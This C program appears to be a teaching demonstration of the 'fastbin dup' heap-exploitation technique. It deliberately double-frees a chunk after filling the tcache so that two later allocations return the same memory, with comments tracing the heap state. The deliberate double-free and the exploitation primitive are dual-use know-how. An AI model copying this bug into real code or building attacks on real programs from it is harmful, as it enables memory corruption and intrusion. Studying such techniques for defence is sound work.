#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {

	int i;
	char *a, *b, *c, *x[7];

	// Allocate 9 things of the same size
	// 7 of these are simply here to fill the tcache in the next step
	// The last 2 will be used for the fastbin dup exploit

	for (i=0; i<7; i++)
		x[i] = malloc(16);

	a = malloc(16);
	b = malloc(16);

	// Free the first 7, thus filling the tcache

	for (i=0; i<7; i++)
		free(x[i]);

	// Free 'a' and 'b', which will end up in the fastbin

	free(a);
	free(b);

	// CURRENT HEAP STATE:
	//   tcache[0x20]:  (x6) -> (x5) -> (x4) -> (x3) -> (x2) -> (x1) -> (x0)
	//   fastbin[0x20]: (b) -> (a)

	// Now the vulnerability!  This simulates a double-free bug.
	// Free 'a' one more time.  Now it's in the fastbin twice, whoops!

	free(a);

	// CURRENT HEAP STATE:
	//   tcache[0x20]:  (x6) -> (x5) -> (x4) -> (x3) -> (x2) -> (x1) -> (x0)
	//   fastbin[0x20]: (a) -> (b) -> (a)

	// Allocate 7 things, to empty the tcache
	for (i=0; i<7; i++)
		x[i] = malloc(16);

	// CURRENT HEAP STATE:
	//   tcache[0x20]:  empty
	//   fastbin[0x20]: (a) -> (b) -> (a)

	// Allocate three things, which will all be served from the fastbin
	// But the first and third will be the same chunk, whoops!!

	a = malloc(16);
	b = malloc(16);
	c = malloc(16);

	// Let's see if it worked...

	strcpy(a, "aaaaaaaa");
	strcpy(c, "cccccccc");

	printf("Contents of 'a' is: %s\n", a);

}